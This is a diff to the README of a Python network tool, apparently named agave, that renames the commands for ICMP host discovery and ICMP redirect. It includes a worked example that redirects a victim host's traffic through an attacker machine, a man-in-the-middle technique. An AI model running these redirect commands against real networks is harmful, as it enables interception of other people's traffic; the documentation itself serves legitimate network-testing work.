@@ -54,17 +54,17 @@ arp
 
 #### Hosts discovery
 ```
-python3 -m agave icmp discovery {subnet}
-python3 -m agave icmp discovery 192.168.1.0/24
+python3 -m agave.icmp.discover {subnet}
+python3 -m agave.icmp.discover 192.168.1.0/24
 ```
 
 #### Host redirect
 ```
-python3 -m agave icmp redirect {target} {attacker} {victim} {gateway}
+python3 -m agave.icmp.redirect {target} {attacker} {victim} {gateway}
 ```
 Example: redirects 192.168.0.3's (victim) messages for Google server DNS (target) to 192.168.0.2 (attacker). 192.168.0.1 is the router the victim is gonna use to reach the target.
 ```
-python3 -m agave icmp redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
+python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
 ```
 The command above is enough to get a couple of messages from the victim. But your system will not forward the messages to their destination, and will tell the victim to use another router to reach the destination instead. So you'll need also to:
 ```
